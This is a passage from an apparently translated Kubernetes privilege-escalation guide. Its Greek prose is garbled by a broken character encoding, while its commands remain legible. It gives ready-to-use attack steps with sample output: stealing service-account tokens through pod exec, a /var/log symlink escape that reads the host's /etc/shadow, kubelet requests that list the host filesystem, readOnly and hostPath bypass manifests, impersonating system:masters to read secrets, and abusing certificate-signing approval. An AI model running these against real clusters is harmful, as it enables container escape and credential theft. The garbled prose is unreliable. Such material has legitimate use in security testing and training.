Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Î¼Ï€ÎµÎ¯Ï„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod ÎºÎ±Î¹ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î¿ token Ï„Î¿Ï… SA**, Î® Î½Î± ÎµÎ¹ÏƒÎ­Î»Î¸ÎµÏ„Îµ ÏƒÎµ Î­Î½Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ pod, Î½Î± Î´Î¹Î±Ï†ÏÎ³ÎµÏ„Îµ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ ÎºÎ±Î¹ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ ÏŒÎ»Î± Ï„Î± tokens Ï„Ï‰Î½ pods ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ ÎºÎ±Î¹ (Î½Î±) (ÎºÎ±Ï„Î±)Ï‡ÏÎ·ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **Ï€ÏÎ¿Ï‰Î¸ÎµÎ¯Ï„Î±Î¹ Î¼Î¯Î± Ï„Î¿Ï€Î¹ÎºÎ® Î¸ÏÏÎ± ÏƒÎµ Î¼Î¯Î± Î¸ÏÏÎ± ÏƒÏ„Î¿ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ pod**. Î‘Ï…Ï„ÏŒ Ï€ÏÎ¿Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Î½Î± Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½ÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ· ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod, Î±Î»Î»Î¬ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ (ÏŒÏ€Ï‰Ï‚ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½) Î® ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ (Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚;) Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

ÎŒÏ€Ï‰Ï‚ [**Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÏÎµÏ…Î½Î±**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î® Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± pod Î¼Îµ Ï„Î¿ **hosts `/var/log/` directory mounted** ÏƒÎµ Î±Ï…Ï„ÏŒ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î¾ÎµÏ†ÏÎ³ÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ container**.\
Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ Î²Î±ÏƒÎ¹ÎºÎ¬ ÎµÏ€ÎµÎ¹Î´Î® ÏŒÏ„Î±Î½ Î¿ **Kube-API Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï„Î± logs** ÎµÎ½ÏŒÏ‚ container (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ `kubectl logs <pod>`), **Î¶Î·Ï„Î¬ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `0.log`** Ï„Î¿Ï… pod Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `/logs/` endpoint Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ **Kubelet**.\
Î— Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Kubelet ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Ï„Î¿ `/logs/` endpoint Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î²Î±ÏƒÎ¹ÎºÎ¬ **ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Ï„Î¿ filesystem `/var/log` Ï„Î¿Ï… container**.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î³Î¹Î± ÎµÎ³Î³ÏÎ±Ï†Î® ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ /var/log/** Ï„Î¿Ï… container Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï…Ï„Î® Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Î¼Îµ 2 Ï„ÏÏŒÏ€Î¿Ï…Ï‚:

* Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `0.log` Ï„Î¿Ï… container Ï„Î¿Ï… (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ `/var/logs/pods/namespace_pod_uid/container/0.log`) ÏÏƒÏ„Îµ Î½Î± ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **symlink Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î¿ `/etc/shadow`** Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ shadow Ï„Ï‰Î½ hosts ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Î‘Î½ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ ÎºÏÏÎ¹Î¿ Î¼Îµ **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· `nodes/log`**, Î¼Ï€Î¿ÏÎµÎ¯ Î±Ï€Î»Î¬ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± **symlink** ÏƒÏ„Î¿ `/host-mounted/var/log/sym` Ï€ÏÎ¿Ï‚ `/` ÎºÎ±Î¹ ÏŒÏ„Î±Î½ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ `https://<gateway>:10250/logs/sym/` Î¸Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿ ÏÎ¹Î¶Î¹ÎºÏŒ** ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï„Ï‰Î½ hosts (Î· Î±Î»Î»Î±Î³Î® Ï„Î¿Ï… symlink Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î±).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**ÎˆÎ½Î± ÎµÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î¿ ÎºÎ±Î¹ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÏ„Î¿** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î±ÏÎºÎµÏ„Î¬ Ï„Ï…Ï‡ÎµÏÎ¿Î¯ ÎºÎ±Î¹ Î· Ï€Î¿Î»Ï Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ® Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„Î± `CAP_SYS_ADMIN` ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î·, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î±Ï€Î»Î¬ Î½Î± Î¾Î±Î½Î±Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ Ï‰Ï‚ rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

ÎŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÎµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÏÎµÏ…Î½Î±**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Î· Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Î Î¿Ï… ÎµÎ¯Ï‡Îµ ÏƒÎºÎ¿Ï€ÏŒ Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î¹Ï‚ Î´Î¹Î±Ï†Ï…Î³Î­Ï‚ ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½ÎµÏ‚, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Î½Ï„Î¯ Î³Î¹Î± hostPath mount, Î­Î½Î± PersistentVolume ÎºÎ±Î¹ Î­Î½Î± PersistentVolumeClaim Î³Î¹Î± Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÎ¹ Î­Î½Î±Î½ Ï†Î¬ÎºÎµÎ»Î¿ Ï„Î¿Ï… host ÏƒÏ„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Î¥Ï€Î¿ÎºÏÎ¹ÏƒÎ¯Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÏÎ½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½**

ÎœÎµ Î­Î½Î± [**Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î¿ Ï…Ï€Î¿ÎºÏÎ¹ÏƒÎ¯Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï…Ï€Î¿ÎºÏÎ¹Î¸ÎµÎ¯ Î­Î½Î±Î½ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ.

Î‘Ï€Î»Î¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `--as=<username>` ÏƒÏ„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `kubectl` Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÎºÏÎ¹Î¸ÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î·, Î® `--as-group=<group>` Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÎºÏÎ¹Î¸ÎµÎ¯Ï„Îµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î±:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Î‰ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

Î— Î¬Î´ÎµÎ¹Î± Î½Î± **ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** Î±Ï€Î¿ÎºÏ„ÏÎ½Ï„Î±Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ REST API endpoint:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Î‘Î½Î¬Î³Î½Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¿Ï â€“ Î²Î¯Î±Î¹Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÏƒÎµ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ token

Î•Î½Ï Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï€Î¿Ï… ÎºÎ±Ï„Î­Ï‡ÎµÎ¹ Î­Î½Î± token Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î¿ Î±ÎºÏÎ¹Î²Î­Ï‚ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î¼Ï…ÏƒÏ„Î¹ÎºÎ¿Ï Î³Î¹Î± Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹, ÏƒÎµ Î±Î½Ï„Î¯Î¸ÎµÏƒÎ· Î¼Îµ Ï„Î¿ ÎµÏ…ÏÏÏ„ÎµÏÎ¿ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î¿ _**ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½**_, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±ÎºÏŒÎ¼Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. ÎŸÎ¹ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Î¹ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Î¯ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î·Î¸Î¿ÏÎ½, ÎºÎ±Î¸Î­Î½Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Î¿Ï€Î¿Î¯Î¿Ï…Ï‚ ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Î­Î½Î± Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ. Î‘Ï…Ï„Î¬ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î­Ï‡Î¿Ï…Î½ Î¼Î¹Î± Î´Î¿Î¼Î® Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚: Î­Î½Î± ÏƒÏ„Î±Ï„Î¹ÎºÏŒ Ï€ÏÏŒÎ¸ÎµÎ¼Î± Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ¼ÎµÎ½Î¿ Î±Ï€ÏŒ Î­Î½Î±Î½ Ï„Ï…Ï‡Î±Î¯Î¿ Î±Î»Ï†Î±ÏÎ¹Î¸Î¼Î·Ï„Î¹ÎºÏŒ token Ï€Î­Î½Ï„Îµ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÏ‰Î½ (ÎµÎ¾Î±Î¹ÏÎ¿Ï…Î¼Î­Î½Ï‰Î½ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Ï‰Î½ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÏ‰Î½) ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î¿Î½ [ÎºÏÎ´Î¹ÎºÎ± Ï€Î·Î³Î®Ï‚](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Î¤Î¿ token Ï€Î±ÏÎ¬Î³ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏÎ½Î¿Î»Î¿ 27 Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÏ‰Î½ (`bcdfghjklmnpqrstvwxz2456789`), Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ Ï€Î»Î®ÏÎµÏ‚ Î±Î»Ï†Î±ÏÎ¹Î¸Î¼Î·Ï„Î¹ÎºÏŒ ÎµÏÏÎ¿Ï‚. Î‘Ï…Ï„ÏŒÏ‚ Î¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Î¼ÎµÎ¹ÏÎ½ÎµÎ¹ Ï„Î¿Î½ ÏƒÏ…Î½Î¿Î»Î¹ÎºÏŒ Î´Ï…Î½Î±Ï„ÏŒ Î±ÏÎ¹Î¸Î¼ÏŒ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼ÏÎ½ ÏƒÎµ 14,348,907 (27^5). Î©Ï‚ ÎµÎº Ï„Î¿ÏÏ„Î¿Ï…, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Î²Î¯Î±Î¹Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î³Î¹Î± Î½Î± deduce Ï„Î¿ token Î¼Î­ÏƒÎ± ÏƒÎµ Î»Î¯Î³ÎµÏ‚ ÏÏÎµÏ‚, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½.

### Î‘Î¹Ï„Î®Î¼Î±Ï„Î± Î¥Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚ Î Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏÎ½

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î± ÏÎ®Î¼Î±Ï„Î± **`create`** ÏƒÏ„Î¿Î½ Ï€ÏŒÏÎ¿ `certificatesigningrequests` (Î® Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ ÏƒÏ„Î¿ `certificatesigningrequests/nodeClient`). ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ** Î­Î½Î± Î½Î­Î¿ CeSR ÎµÎ½ÏŒÏ‚ **Î½Î­Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï….**

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î·Î½ [Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î· Î­Î³ÎºÏÎ¹ÏƒÎ· Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), Î¿Ï€ÏŒÏ„Îµ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· **Î´ÎµÎ½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±**. Î‘Î½ ÏŒÏ‡Î¹, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ³ÎºÏÎ¯Î½ÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î±, Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· ÏƒÏ„Î¿ `certificatesigningrequests/approval` ÎºÎ±Î¹ `approve` ÏƒÏ„Î¿ `signers` Î¼Îµ resourceName `<signerNameDomain>/<signerNamePath>` Î® `<signerNameDomain>/*`

ÎˆÎ½Î± **Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÏÏŒÎ»Î¿Ï…** Î¼Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÎ¯Î½Î±Î¹:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
ÎˆÏ„ÏƒÎ¹, Î¼Îµ Ï„Î·Î½ Î­Î³ÎºÏÎ¹ÏƒÎ· Ï„Î¿Ï… Î½Î­Î¿Ï… CSR ÎºÏŒÎ¼Î²Î¿Ï…, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ** Ï„Î¹Ï‚ ÎµÎ¹Î´Î¹ÎºÎ­Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Ï„Ï‰Î½ ÎºÏŒÎ¼Î²Ï‰Î½ Î³Î¹Î± Î½Î± **ÎºÎ»Î­ÏˆÎµÏ„Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** ÎºÎ±Î¹ Î½Î± **ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÏ„Îµ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±**.

